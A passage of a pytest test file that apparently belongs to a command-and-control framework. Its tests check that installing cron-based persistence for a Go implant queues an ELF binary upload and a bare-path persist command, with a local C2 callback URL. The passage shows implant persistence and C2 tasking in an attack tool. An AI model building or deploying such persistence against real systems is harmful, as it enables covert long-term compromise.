        from major.db import create_session, get_pending_tasks
        from server import ursa_install_persistence
        sid = create_session("1.2.3.4", hostname="linbox", username="u",
                              os_info="Linux 5.15", arch="x86_64",
                              encryption_key="a" * 64)
        ursa_install_persistence(sid, method="cron", implant_type="go",
                                 c2_url="http://127.0.0.1:6708")
        tasks = get_pending_tasks(sid)
        upload = next(t for t in tasks if t["task_type"] == "upload")
        args = json.loads(upload["args"])
        binary = base64.b64decode(args["data"])
        assert binary[:4] == b"\x7fELF", "Expected ELF binary for Linux target"

    @pytest.mark.skipif(
        __import__("shutil").which("go") is None,
        reason="Go compiler not installed"
    )
    def test_go_persist_command_has_no_python3(self, tmp_db):
        """The persist command for Go should be a bare path, no python3."""
        import json

        from major.db import create_session, get_pending_tasks
        from server import ursa_install_persistence
        sid = create_session("1.2.3.4", hostname="linbox", username="u",
                              os_info="Linux 5.15", arch="x86_64",
                              encryption_key="a" * 64)
        ursa_install_persistence(sid, method="cron", implant_type="go",
                                 c2_url="http://127.0.0.1:6708")
        tasks = get_pending_tasks(sid)
        post_task = next(t for t in tasks if t["task_type"] == "post")
        post_args = json.loads(post_task["args"])
        module_args = post_args.get("args", {})
        assert "python3" not in module_args.get("command", "")
